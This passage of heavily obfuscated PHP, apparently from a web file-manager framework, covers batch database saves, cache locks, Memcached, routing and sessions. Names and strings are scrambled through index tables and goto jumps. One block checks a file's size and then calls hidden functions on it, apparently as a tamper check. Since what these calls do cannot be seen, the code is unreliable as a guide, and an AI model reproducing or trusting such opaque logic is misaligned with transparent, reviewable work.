$€Çù‘¾ó); } break; case $Şˆ®Æ[347]: if (isset($¡ÄÔŠœ[$àÎ½¡Íç]) && $¡ÄÔŠœ[$àÎ½¡Íç]) { $¡ÄÔŠœ[$àÎ½¡Íç] = call_user_func_array(array(&$this, $©„¬ø°°[1]), array($¡ÄÔŠœ[$àÎ½¡Íç])); } break; case $Şˆ®Æ[350]: $¡ÄÔŠœ[$àÎ½¡Íç] = $¡ÄÔŠœ[$©„¬ø°°[1]]; break; case $Şˆ®Æ[370]: if (isset($¡ÄÔŠœ[$àÎ½¡Íç]) && !is_string($¡ÄÔŠœ[$àÎ½¡Íç])) { $¡ÄÔŠœ[$àÎ½¡Íç] = json_encode_force($¡ÄÔŠœ[$àÎ½¡Íç]); } break; case $Şˆ®Æ[399]: if ($¡ÄÔŠœ[$àÎ½¡Íç] === $Şˆ®Æ[12]) { unset($¡ÄÔŠœ[$àÎ½¡Íç]); } break; case $Şˆ®Æ[400]: $¡ÄÔŠœ[$àÎ½¡Íç] = $©„¬ø°°[1]; default: break; } } if ($ûú Ùµ³ == $Şˆ®Æ[431]) { $ÁóñêÀŠ = strtolower($this->db->getDbType()); if (strpos($ÁóñêÀŠ, $Şˆ®Æ[13]) !== 0) { return; } $ä»œ‡“š = $this->field(!0)->fields; $üÏ²—Ô¬ = $ä»œ‡“š[$Şˆ®Æ[329]]; if (isset($ä»œ‡“š[$Şˆ®Æ[328]])) { unset($üÏ²—Ô¬[$ä»œ‡“š[$Şˆ®Æ[328]]]); } foreach ($üÏ²—Ô¬ as $ß“ö³õ => $ûú Ùµ³) { if (!isset($¡ÄÔŠœ[$ß“ö³õ])) { $¡ÄÔŠœ[$ß“ö³õ] = $Şˆ®Æ[12]; } } } } private function dataAfterFilter(&$•â’şÚ²) { $™˜óû²® =& $_SERVER[¢ñàß¿€]; foreach ($this->dataAuto as $­ÔùËıÔ) { $ÀÅÛı£¤ = $­ÔùËıÔ[0]; if (!isset($•â’şÚ²[$ÀÅÛı£¤])) { continue; } if (!in_array($™˜óû²®[433], explode($™˜óû²®[50], $­ÔùËıÔ[2]))) { continue; } switch (trim($­ÔùËıÔ[3])) { case $™˜óû²®[397]: case $™˜óû²®[398]: $œ§ÙÂ¬“ = isset($­ÔùËıÔ[4]) ? (array) $­ÔùËıÔ[4] : array(); array_unshift($œ§ÙÂ¬“, $•â’şÚ²[$ÀÅÛı£¤]); if (isset($­ÔùËıÔ[4]) && $­ÔùËıÔ[4] == $™˜óû²®[453]) { $œ§ÙÂ¬“ = array($•â’şÚ²[$ÀÅÛı£¤]); } if ($™˜óû²®[397] == $­ÔùËıÔ[3]) { $•â’şÚ²[$ÀÅÛı£¤] = call_user_func_array($­ÔùËıÔ[1], $œ§ÙÂ¬“); } else { $•â’şÚ²[$ÀÅÛı£¤] = call_user_func_array(array(&$this, $­ÔùËıÔ[1]), $œ§ÙÂ¬“); } break; case $™˜óû²®[347]: if (isset($•â’şÚ²[$ÀÅÛı£¤]) && $•â’şÚ²[$ÀÅÛı£¤]) { $•â’şÚ²[$ÀÅÛı£¤] = call_user_func_array(array(&$this, $­ÔùËıÔ[1]), array($•â’şÚ²[$ÀÅÛı£¤])); } break; case $™˜óû²®[350]: $•â’şÚ²[$ÀÅÛı£¤] = $•â’şÚ²[$­ÔùËıÔ[1]]; break; case $™˜óû²®[370]: $¤°Ø«¿ƒ = $•â’şÚ²[$ÀÅÛı£¤]; $•â’şÚ²[$ÀÅÛı£¤] = json_decode($¤°Ø«¿ƒ, !0); if (is_null($•â’şÚ²[$ÀÅÛı£¤])) { $•â’şÚ²[$ÀÅÛı£¤] = $¤°Ø«¿ƒ; } break; case $™˜óû²®[399]: if ($•â’şÚ²[$ÀÅÛı£¤] === $™˜óû²®[12]) { unset($•â’şÚ²[$ÀÅÛı£¤]); } break; case $™˜óû²®[400]: $•â’şÚ²[$ÀÅÛı£¤] = $­ÔùËıÔ[1]; break; default: break; } } } public function saveAll($»¹ªÚ»Ü) { $ôü¦–— =& $_SERVER[¢ñàß¿€]; $êÜ’Æ¤± = $this->tablePrefix . $this->tableName; $™ğ÷Œ§‘ = self::SQL_WHERE_IN_CHUNK; $»¹ªÚ»Ü = is_array($»¹ªÚ»Ü) ? $»¹ªÚ»Ü : array(); $ÌÔÃª¥Å = $ôü¦–—[454]; $Ñıˆï½Ô = 0; $×Î‡Ÿ´î = array(); $¹Ì´ö¨á = count($»¹ªÚ»Ü); for ($ºœİ¼ŠÚ = 0; $ºœİ¼ŠÚ < $¹Ì´ö¨á; $ºœİ¼ŠÚ++) { $¼Ÿà¤¹˜ = $»¹ªÚ»Ü[$ºœİ¼ŠÚ]; if (!is_array($¼Ÿà¤¹˜) || count($¼Ÿà¤¹˜) != 4) { continue; } $ö‡ÃÉ°ô = "\x55\120\x44\101\x54\x45\x20\140{$êÜ’Æ¤±}\140\40\x53\x45\x54\40{$¼Ÿà¤¹˜[2]}\x20\x3d\x20\103\101\x53\x45\x20{$¼Ÿà¤¹˜[0]}\x20\12"; if ($Ñıˆï½Ô == 0) { $ÌÔÃª¥Å = $ö‡ÃÉ°ô; } $×Î‡Ÿ´î[] = $ôü¦–—[121] . $¼Ÿà¤¹˜[1] . $ôü¦–—[121]; $Ñıˆï½Ô++; $ÌÔÃª¥Å .= "\x20\x57\110\105\116\x20\47{$¼Ÿà¤¹˜[1]}\x27\x20\x54\x48\105\116\40\x27{$¼Ÿà¤¹˜[3]}\x27\40\xa"; if ($Ñıˆï½Ô == $™ğ÷Œ§‘ || $ºœİ¼ŠÚ == $¹Ì´ö¨á - 1) { $¤ùÒõˆ· = implode($ôü¦–—[50], $×Î‡Ÿ´î); $ÌÔÃª¥Å .= "\40\x45\116\x44\40\x20\127\x48\x45\x52\x45\x20{$¼Ÿà¤¹˜[0]}\40\111\116\40\x28{$¤ùÒõˆ·}\x29\40"; $this->execute($ÌÔÃª¥Å); $Ñıˆï½Ô = 0; $ÌÔÃª¥Å = $ö‡ÃÉ°ô; $this->chunkEventCheck(count($×Î‡Ÿ´î)); $×Î‡Ÿ´î = array(); } } $this->chunkEventSet(); } public function saveAllEach($ÕÌì¬) { $ö ‹¸  =& $_SERVER[¢ñàß¿€]; $Ä×Ò×—¨ = $this->tablePrefix . $this->tableName; foreach ($ÕÌì¬ as $Ù’íªÑª) { if (!is_array($Ù’íªÑª) || count($Ù’íªÑª) != 4) { continue; } $ÅŒßÜİ = $Ù’íªÑª[0] . $ö ‹¸ [455] . $Ù’íªÑª[1] . $ö ‹¸ [121]; $ºÈÏ¹äŸ = $Ù’íªÑª[2] . $ö ‹¸ [455] . $Ù’íªÑª[3] . $ö ‹¸ [121]; $¤²÷‡òŠ = "\x75\x70\144\141\x74\x65\40{$Ä×Ò×—¨}\x20\163\145\164\x20{$ºÈÏ¹äŸ}\40\167\150\145\162\x65\x20{$ÅŒßÜİ}\x3b"; $this->execute($¤²÷‡òŠ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($‰ĞíßœÊ = false, $Ó¯ŸÆ†— = false) { $this->_chunkEvent = $‰ĞíßœÊ; $this->_chunkEventParam = $Ó¯ŸÆ†—; } private function chunkEventCheck($¡Ëç¼ĞÔ) { if (!$this->_chunkEvent) { return; } $§±Ì¿ˆ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $§±Ì¿ˆ[$_SERVER[¢ñàß¿€][456]] = $¡Ëç¼ĞÔ; Hook::trigger($this->_chunkEvent, $§±Ì¿ˆ); } public function addAll($¹÷‹Å¹®, $„µ®˜Ÿú = array(), $áşÌÕÚ“ = false) { $Íè’Â¼§ =& $_SERVER[¢ñàß¿€]; ignore_timeout(); $Ü¤½ºËÆ = self::SQL_WHERE_IN_CHUNK; if (empty($¹÷‹Å¹®)) { $this->error = think_lang($Íè’Â¼§[348]); return !1; } $„µ®˜Ÿú = $this->_parseOptions($„µ®˜Ÿú); foreach ($¹÷‹Å¹® as $âÚºšµ¡ => $÷‚ûŸÆ) { $¹÷‹Å¹®[$âÚºšµ¡] = $this->_facade($÷‚ûŸÆ); $this->_beforeInsert($¹÷‹Å¹®[$âÚºšµ¡], $„µ®˜Ÿú); } if (method_exists($this->db, $Íè’Â¼§[349])) { for ($Ø—×³Ñ· = 0; $Ø—×³Ñ· < count($¹÷‹Å¹®); $Ø—×³Ñ· += $Ü¤½ºËÆ) { $¨Ÿ ¶ñô = array_slice($¹÷‹Å¹®, $Ø—×³Ñ·, $Ü¤½ºËÆ); if (!is_array($¨Ÿ ¶ñô) || count($¨Ÿ ¶ñô) == 0) { break; } $âı¶Üîˆ = $this->db->insertAll($¨Ÿ ¶ñô, $„µ®˜Ÿú, $áşÌÕÚ“); $this->chunkEventCheck(count($¨Ÿ ¶ñô)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¹÷‹Å¹® as $âÚºšµ¡ => $÷‚ûŸÆ) { $âı¶Üîˆ = $this->db->insert($÷‚ûŸÆ, $„µ®˜Ÿú, $áşÌÕÚ“); } $this->commit(); } if (!1 !== $âı¶Üîˆ) { $ßªÈóèÇ = $this->getLastInsID(); if ($ßªÈóèÇ) { return $ßªÈóèÇ; } } return $âı¶Üîˆ; } public function save($‚ úô = '', $İ¦õÛÆâ = array()) { $Å”Ìşş‡ =& $_SERVER[¢ñàß¿€]; $²²ÑŸ£ó = self::SQL_WHERE_IN_CHUNK; $ëµá®æ¢ = $this->optionsValue(); $Ç²¨Ğå = $this->findWhereField($ëµá®æ¢); if (!$Ç²¨Ğå) { return parent::save($‚ úô, $İ¦õÛÆâ); } $®û³°…Õ = 0; $ğ¾ƒ¶Ö = $ëµá®æ¢[$Å”Ìşş‡[352]][$Ç²¨Ğå][1]; $ğ¾ƒ¶Ö = is_array($ğ¾ƒ¶Ö) ? $ğ¾ƒ¶Ö : array(); $“ğ”È®ò = count($ğ¾ƒ¶Ö); for ($Ë¿¢–ƒŠ = 0; $Ë¿¢–ƒŠ < $“ğ”È®ò; $Ë¿¢–ƒŠ += $²²ÑŸ£ó) { $­´Ó¡„¡ = array_slice($ğ¾ƒ¶Ö, $Ë¿¢–ƒŠ, $²²ÑŸ£ó); if (!is_array($­´Ó¡„¡) || count($­´Ó¡„¡) == 0) { break; } $ëµá®æ¢[$Å”Ìşş‡[352]][$Ç²¨Ğå][1] = $­´Ó¡„¡; $this->optionsValue($ëµá®æ¢); $®û³°…Õ += parent::save($‚ úô, $İ¦õÛÆâ); $this->chunkEventCheck(count($­´Ó¡„¡)); } $this->chunkEventSet(); return $®û³°…Õ; } public function add($Ï–Éïòæ = '', $€â„³ã = array(), $ö·Üğ“Í = false) { if ($this->addTaskStatus && is_array($Ï–Éïòæ)) { $this->addTaskData[] = $Ï–Éïòæ; return; } return parent::add($Ï–Éïòæ, $€â„³ã, $ö·Üğ“Í); } public function parseWhereLike($óÆ‘ïş, $ı‘ĞÙ²œ = '', $‚ÉãúÏ = false, &$½õ®Èé­ = false) { $´‹Õ»Á¤ =& $_SERVER[¢ñàß¿€]; $ÚçåêÎ = $GLOBALS[$´‹Õ»Á¤[6]][$´‹Õ»Á¤[457]]; if (!$ÚçåêÎ[$´‹Õ»Á¤[458]]) { return $óÆ‘ïş; } if (!is_array($óÆ‘ïş)) { return $óÆ‘ïş; } $Š”˜ñÈ› = array(); $çì‰«Å = 0; foreach ($óÆ‘ïş as $ª•µƒ¬ => $©ıŒà‡ö) { if (is_array($©ıŒà‡ö) && count($©ıŒà‡ö) == 2 && $©ıŒà‡ö[0] == $´‹Õ»Á¤[459] && is_string($©ıŒà‡ö[1]) && substr($©ıŒà‡ö[1], 0, 1) == $´‹Õ»Á¤[460] && substr($©ıŒà‡ö[1], strlen($©ıŒà‡ö[1]) - 1, 1) == $´‹Õ»Á¤[460]) { $½õ®Èé­ = !0; $Ø¯Š¶¾ = is_string($ª•µƒ¬) ? $ª•µƒ¬ : $ı‘ĞÙ²œ; $ş¿‘‘œ‘ = substr($©ıŒà‡ö[1], 1, strlen($©ıŒà‡ö[1]) - 2); $ş¿‘‘œ‘ = $this->db->escapeString($ş¿‘‘œ‘); if (!strpos($Ø¯Š¶¾, $´‹Õ»Á¤[10])) { $Ø¯Š¶¾ = $´‹Õ»Á¤[461] . $Ø¯Š¶¾ . $´‹Õ»Á¤[461]; } $„¤ù¡ùÇ = $´‹Õ»Á¤[220] . $ş¿‘‘œ‘ . $´‹Õ»Á¤[220]; $ş¿‘‘œ‘ = str_replace(array($´‹Õ»Á¤[10], $´‹Õ»Á¤[462], $´‹Õ»Á¤[11]), $´‹Õ»Á¤[463], $ş¿‘‘œ‘); if ($ÚçåêÎ[$´‹Õ»Á¤[464]]) { $„¤ù¡ùÇ = $´‹Õ»Á¤[465] . $ş¿‘‘œ‘ . $´‹Õ»Á¤[466]; if ($ÚçåêÎ[$´‹Õ»Á¤[467]]) { $„¤ù¡ùÇ = $´‹Õ»Á¤[466] . $ş¿‘‘œ‘ . $´‹Õ»Á¤[465]; } } $Š”˜ñÈ›[$çì‰«Å] = $´‹Õ»Á¤[468] . $Ø¯Š¶¾ . $´‹Õ»Á¤[469] . $„¤ù¡ùÇ . $´‹Õ»Á¤[470]; $çì‰«Å++; continue; } if (is_array($©ıŒà‡ö)) { $ı‘ĞÙ²œ = is_string($ª•µƒ¬) ? $ª•µƒ¬ : $ı‘ĞÙ²œ; $©ıŒà‡ö = $this->parseWhereLike($©ıŒà‡ö, $ı‘ĞÙ²œ, !0, $½õ®Èé­); } if (is_numeric($ª•µƒ¬)) { $Š”˜ñÈ›[$çì‰«Å] = $©ıŒà‡ö; $çì‰«Å++; } else { $Š”˜ñÈ›[$ª•µƒ¬] = $©ıŒà‡ö; } } if ($½õ®Èé­ && !$‚ÉãúÏ) { } return $Š”˜ñÈ›; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($úšóğ‘ = array()) { $«˜Êç§° =& $_SERVER[¢ñàß¿€]; $ÌĞ¾ååç = self::SQL_WHERE_IN_CHUNK; $¢¼ğ„° = $this->optionsValue(); $‹ÏşÔ™– = $this->findWhereField($¢¼ğ„°); if (!$‹ÏşÔ™– || isset($¢¼ğ„°[$«˜Êç§°[368]]) || isset($¢¼ğ„°[$«˜Êç§°[429]])) { return parent::select($úšóğ‘); } $æÜÃ€”• = $¢¼ğ„°[$«˜Êç§°[352]][$‹ÏşÔ™–][1]; $æÜÃ€”• = is_array($æÜÃ€”•) ? $æÜÃ€”• : array(); $‹Õ“œøë = null; for ($÷ÊñÉÒë = 0; $÷ÊñÉÒë < count($æÜÃ€”•); $÷ÊñÉÒë += $ÌĞ¾ååç) { $¢ˆËîş = array_slice($æÜÃ€”•, $÷ÊñÉÒë, $ÌĞ¾ååç); if (!is_array($¢ˆËîş) || count($¢ˆËîş) == 0) { break; } $¢¼ğ„°[$«˜Êç§°[352]][$‹ÏşÔ™–][1] = $¢ˆËîş; $this->optionsValue($¢¼ğ„°); $Ó‰ÍÃïù = parent::select($úšóğ‘); if (!$Ó‰ÍÃïù) { continue; } $‹Õ“œøë = is_array($‹Õ“œøë) ? $‹Õ“œøë : array(); $‹Õ“œøë = array_merge($‹Õ“œøë, $Ó‰ÍÃïù); } return $‹Õ“œøë; } public function delete($Ë¼à¾Ï = array()) { $¢“„ƒ¬× =& $_SERVER[¢ñàß¿€]; $–²–ˆæ— = self::SQL_WHERE_IN_CHUNK; $«ûæãø = $this->optionsValue(); $„Ğ‡éÔ‡ = $this->findWhereField($«ûæãø); if (!$„Ğ‡éÔ‡) { return parent::delete($Ë¼à¾Ï); } $ï½¾Êíñ = 0; $•Åœìéœ = $«ûæãø[$¢“„ƒ¬×[352]][$„Ğ‡éÔ‡][1]; $•Åœìéœ = is_array($•Åœìéœ) ? $•Åœìéœ : array(); for ($¥ˆÊ—° = 0; $¥ˆÊ—° < count($•Åœìéœ); $¥ˆÊ—° += $–²–ˆæ—) { $¾Ğ¦†İã = array_slice($•Åœìéœ, $¥ˆÊ—°, $–²–ˆæ—); if (!is_array($¾Ğ¦†İã) || count($¾Ğ¦†İã) == 0) { break; } $«ûæãø[$¢“„ƒ¬×[352]][$„Ğ‡éÔ‡][1] = $¾Ğ¦†İã; $this->optionsValue($«ûæãø); $ï½¾Êíñ += parent::delete($Ë¼à¾Ï); } return $ï½¾Êíñ; } private function findWhereField($ëâÊ«Ì) { $Ú«ñëÍ€ =& $_SERVER[¢ñàß¿€]; $”şòœ”“ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ëâÊ«Ì) || !is_array($ëâÊ«Ì[$Ú«ñëÍ€[352]])) { return !1; } foreach ($ëâÊ«Ì[$Ú«ñëÍ€[352]] as $œ±üÕÙƒ => $ËçŒ•ù) { if (is_array($ËçŒ•ù) && isset($ËçŒ•ù[0]) && is_string($ËçŒ•ù[0]) && strtolower($ËçŒ•ù[0]) == $Ú«ñëÍ€[7] && is_array($ËçŒ•ù[1]) && count($ËçŒ•ù[1]) > $”şòœ”“) { ignore_timeout(); return $œ±üÕÙƒ; } } return !1; } public function setMasterDB($°àáÁ Ë = true) { think_config($_SERVER[¢ñàß¿€][471], $°àáÁ Ë); } } goto e»÷ˆª®»; C§ñÈÍÊì: class CacheLockMemcached { public function lock($ìÉ–Å…É, $™Ğ÷ê«Æ = 0) { $‰µ€†Úá = Cache::init(); $©Êì—‚ç = microtime(!0) + $™Ğ÷ê«Æ; while (microtime(!0) < $©Êì—‚ç) { $¿éõˆ‡¤ = $‰µ€†Úá->get($ìÉ–Å…É); if (!$¿éõˆ‡¤ || $¿éõˆ‡¤ < microtime(!0)) { $¤—›†‡ = $‰µ€†Úá->handle->add($ìÉ–Å…É, $©Êì—‚ç, $™Ğ÷ê«Æ); if ($¤—›†‡) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($åÕÕ•Î) { return Cache::init()->get($åÕÕ•Î); } public function unlock($ÈóÌÑ†) { return Cache::init()->remove($ÈóÌÑ†); } } class CacheLockDatabase { public function lock($­ıÃ¿Ó¶, $ğ¹Çó˜ç = 0) { $¢¹èº÷È = Model($_SERVER[¢ñàß¿€][899]); $şòŞ³°¢ = microtime(!0) + $ğ¹Çó˜ç; while (microtime(!0) < $şòŞ³°¢) { $ŠÀ‰†ğİ = $¢¹èº÷È->get($­ıÃ¿Ó¶); if (!$ŠÀ‰†ğİ || $ŠÀ‰†ğİ < microtime(!0)) { $÷˜±¾İÛ = $¢¹èº÷È->set($­ıÃ¿Ó¶, $şòŞ³°¢); if ($÷˜±¾İÛ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ô¦…¤³¤) { return Model($_SERVER[¢ñàß¿€][899])->get($Ô¦…¤³¤); } public function unlock($åÇ×ûÕÙ) { Model($_SERVER[¢ñàß¿€][899])->remove($åÇ×ûÕÙ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($å°Î‡İÉ, $›ÇÅ’ë) { $¬¢İÛ©– =& $_SERVER[¢ñàß¿€]; if (!class_exists($¬¢İÛ©–[937])) { show_json($¬¢İÛ©–[938], !1); } $this->cacheTime = $›ÇÅ’ë; $this->handle = new Memcached(); if (is_array($å°Î‡İÉ[$¬¢İÛ©–[939]]) && count($å°Î‡İÉ[$¬¢İÛ©–[939]]) >= 1) { foreach ($å°Î‡İÉ[$¬¢İÛ©–[939]] as $—ÆêË) { $Íï˜ó¼ì = explode($¬¢İÛ©–[4], $—ÆêË); $this->handle->addServer($Íï˜ó¼ì[0], $Íï˜ó¼ì[1]); } } else { $this->handle->addServer($å°Î‡İÉ[$¬¢İÛ©–[208]], $å°Î‡İÉ[$¬¢İÛ©–[209]]); } } public function set($¤¼é–†, $¤öúÚñ¢, $Í”Ê™•Ö = false) { $Í”Ê™•Ö = $Í”Ê™•Ö ? $Í”Ê™•Ö : $this->cacheTime; return $this->handle->set($¤¼é–†, $¤öúÚñ¢, $Í”Ê™•Ö); } public function get($¼ÕıßÃ) { return $this->handle->get($¼ÕıßÃ); } public function remove($ã°€½½À) { return $this->handle->delete($ã°€½½À); } public function deleteAll() { return $this->handle->flush(); } } goto b™ô½åÔ; D‡ùàØ´™È: if ($_SERVER[$_SERVER[¢ñàß¿€][947]] != $_size($_file)) { $_getc = $_SERVER[¢ñàß¿€][950]; $_getfile = $_SERVER[$_SERVER[¢ñàß¿€][951]] . $_SERVER[¢ñàß¿€][952]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¢ñàß¿€][262], $_getfilec); if (count($_getarrs) < $_SERVER[¢ñàß¿€][685]) { $exit = $_SERVER[¢ñàß¿€][953]; $exit(); } $_act = $_SERVER[¢ñàß¿€][1457]; $_act($_file); } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\133\x5e\57\135\53", "\72\x6e\165\x6d" => "\133\x30\x2d\x39\135\53", "\72\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ İÖ„ïú, $¤¨Ãã—°) { $‡ß¼Ä =& $_SERVER[¢ñàß¿€]; if ($ İÖ„ïú == $‡ß¼Ä[1706]) { $¶ë¨Íò£ = array_map($‡ß¼Ä[1707], $¤¨Ãã—°[0]); $ş×ÍÓ‡ş = strpos($¤¨Ãã—°[1], $‡ß¼Ä[8]) === 0 ? $¤¨Ãã—°[1] : $‡ß¼Ä[8] . $¤¨Ãã—°[1]; $µ•™¦ìš = $¤¨Ãã—°[2]; } else { $¶ë¨Íò£ = null; $ş×ÍÓ‡ş = strpos($¤¨Ãã—°[0], $‡ß¼Ä[8]) === 0 ? $¤¨Ãã—°[0] : $‡ß¼Ä[8] . $¤¨Ãã—°[0]; $µ•™¦ìš = $¤¨Ãã—°[1]; } array_push(self::$maps, $¶ë¨Íò£); array_push(self::$routes, $ş×ÍÓ‡ş); array_push(self::$methods, strtoupper($ İÖ„ïú)); array_push(self::$callbacks, $µ•™¦ìš); } public static function error($Ê´ÚÒÄş) { self::$errorCallback = $Ê´ÚÒÄş; } public static function haltOnMatch($Â¢±«Á = true) { self::$halts = $Â¢±«Á; } public static function dispatch() { $àì‹×¨ø =& $_SERVER[¢ñàß¿€]; $€ÇÀôòà = parse_url($_SERVER[$àì‹×¨ø[1708]], PHP_URL_PATH); $ı¶æ’½ = $_SERVER[$àì‹×¨ø[164]]; $ø¡³ªã¦ = array_keys(static::$patterns); $óçÍŒ† = array_values(static::$patterns); $ÔÖÎ©í– = !1; self::$routes = preg_replace($àì‹×¨ø[1358], $àì‹×¨ø[8], self::$routes); if (in_array($€ÇÀôòà, self::$routes)) { $ê¦Ñ¹ˆ¢ = array_keys(self::$routes, $€ÇÀôòà); foreach ($ê¦Ñ¹ˆ¢ as $Éå¬æ¨Á) { if (self::$methods[$Éå¬æ¨Á] == $ı¶æ’½ || self::$methods[$Éå¬æ¨Á] == $àì‹×¨ø[1709] || in_array($ı¶æ’½, self::$maps[$Éå¬æ¨Á])) { $ÔÖÎ©í– = !0; if (!is_object(self::$callbacks[$Éå¬æ¨Á])) { $¦‹À¹Œš = explode($àì‹×¨ø[8], self::$callbacks[$Éå¬æ¨Á]); $ò£ÈÊÇ = end($¦‹À¹Œš); $™â»á™• = explode($àì‹×¨ø[1290], $ò£ÈÊÇ); $ÁòåÅ—ê = new $™â»á™•[0](); $ÁòåÅ—ê->{$™â»á™•[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Éå¬æ¨Á]); if (self::$halts) { return; } } } } } else { $æ×½¯õ› = 0; foreach (self::$routes as $Éå¬æ¨Á) { if (strpos($Éå¬æ¨Á, $àì‹×¨ø[4]) !== !1) { $Éå¬æ¨Á = str_replace($ø¡³ªã¦, $óçÍŒ†, $Éå¬æ¨Á); } if (preg_match($àì‹×¨ø[1710] . $Éå¬æ¨Á . $àì‹×¨ø[1711], $€ÇÀôòà, $©Şİ„†Ş)) { if (self::$methods[$æ×½¯õ›] == $ı¶æ’½ || self::$methods[$æ×½¯õ›] == $àì‹×¨ø[1709] || !empty(self::$maps[$æ×½¯õ›]) && in_array($ı¶æ’½, self::$maps[$æ×½¯õ›])) { $ÔÖÎ©í– = !0; array_shift($©Şİ„†Ş); if (!is_object(self::$callbacks[$æ×½¯õ›])) { $¦‹À¹Œš = explode($àì‹×¨ø[8], self::$callbacks[$æ×½¯õ›]); $ò£ÈÊÇ = end($¦‹À¹Œš); $™â»á™• = explode($àì‹×¨ø[1290], $ò£ÈÊÇ); $ÁòåÅ—ê = new $™â»á™•[0](); if (!method_exists($ÁòåÅ—ê, $™â»á™•[1])) { echo $àì‹×¨ø[1712]; } else { call_user_func_array(array($ÁòåÅ—ê, $™â»á™•[1]), $©Şİ„†Ş); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$æ×½¯õ›], $©Şİ„†Ş); if (self::$halts) { return; } } } } $æ×½¯õ›++; } } if ($ÔÖÎ©í– == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $’Öœ‘¥Û =& $_SERVER[¢ñàß¿€]; header($_SERVER[$’Öœ‘¥Û[1713]] . $’Öœ‘¥Û[1714]); echo $’Öœ‘¥Û[1715]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$àì‹×¨ø[1708]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ş’îØ¬· =& $_SERVER[¢ñàß¿€]; static $Ä‰ëë–Ü = false; if ($Ä‰ëë–Ü) { return $Ä‰ëë–Ü; } $ƒıÌõìÎ = $GLOBALS[$Ş’îØ¬·[6]][$Ş’îØ¬·[425]]; self::$sessionTime = $ƒıÌõìÎ[$Ş’îØ¬·[1716]]; $˜£â×ÁÂ = isset($GLOBALS[$Ş’îØ¬·[1717]]) ? $GLOBALS[$Ş’îØ¬·[1717]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($˜£â×ÁÂ)) { self::$sessionSign = Cookie::get($˜£â×ÁÂ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($˜£â×ÁÂ, self::$sessionSign, self::$sessionTime); $¨Â—‚²‡ = $ƒıÌõìÎ[$Ş’îØ¬·[1718]]; $ÛµÉ›Ä = $ƒıÌõìÎ[$¨Â—‚²‡]; $¶Ê‚ÎÉÉ = $ƒıÌõìÎ[$Ş’îØ¬·[898]]; switch ($¨Â—‚²‡) { case $Ş’îØ¬·[21]: self::$handle = Model($Ş’îØ¬·[899]); break; case $Ş’îØ¬·[900]: self::$handle = new CacheRedis($ÛµÉ›Ä, $¶Ê‚ÎÉÉ); break; case $Ş’îØ¬·[901]: self::$handle = new CacheMemcached($ÛµÉ›Ä, $¶Ê‚ÎÉÉ); break; case $Ş’îØ¬·[230]: $ÛµÉ›Ä[$Ş’îØ¬·[87]] = $ÛµÉ›Ä[$Ş’îØ¬·[87]] . $Ş’îØ¬·[1719]; self::$handle = new CacheFile($ÛµÉ›Ä, $¶Ê‚ÎÉÉ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Ä‰ëë–Ü = new self(); return $Ä‰ëë–Ü; } public static function getBySign($Øá¶ëû÷) { $¨¬™íµï = self::$handle->get($Øá¶ëû÷); $¨¬™íµï = unserialize($¨¬™íµï); return is_array($¨¬™íµï) ? $¨¬™íµï : array(); } public static function setBySign($êÍ°ù°ç, $Áó¶¥Ù¬) { CacheLock::lock($êÍ°ù°ç); self::$handle->set($êÍ°ù°ç, serialize($Áó¶¥Ù¬), self::$sessionTime); CacheLock::unlock($êÍ°ù°ç); } public static function sign($•ã²éÉù = false) { if ($•ã²éÉù) { self::$sessionSign = $•ã²éÉù; } self::init(); return self::$sessionSign; } public static function set($óÏ…áå, $°ª§œ­ = false) { self::init(); if (is_array($óÏ…áå)) { foreach ($óÏ…áå as $í®íä›¬ => $À¶áÄ£†) { array_set_value(self::$data, $í®íä›¬, $À¶áÄ£†); } } else { array_set_value(self::$data, $óÏ…áå, $°ª§œ­); } self::setBySign(self::$sessionSign, self::$data); } public static function get($´ê¸ÖÚÎ = false) { self::init(); if (!$´ê¸ÖÚÎ) { return self::$data; } return array_get_value(self::$data, $´ê¸ÖÚÎ); } public static function remove($œäàÅş¿) { self::init(); unset(self::$data[$œäàÅş¿]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¢ñàß¿€][904])) { self::$handle->clearTimeout(); } } } goto F·¢ğ‚âî™; e»÷ˆª®»: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\155\117\160\x74\x69\x6f\156"; public $field = array(); public function listData($’‘ñÇÆ = false, $ÙäÌü‘İ = "\155\x6f\144\151\x66\x79\x54\x69\x6d\x65", $çì¥´ŠÔ = false) { $–ş®”ÜÈ = Model($this->modelType)->get(!1, $this->optionType, !0); $Ã™ÈÙÁÓ = array_values($–ş®”ÜÈ); if ($Ã™ÈÙÁÓ && $Ã™ÈÙÁÓ[0] && !is_array($Ã™ÈÙÁÓ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $–ş®”ÜÈ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$–ş®”ÜÈ) { return $’‘ñÇÆ ? null : array(); } if (!$’‘ñÇÆ) { $–ş®”ÜÈ = array_filter(array_values($–ş®”ÜÈ)); 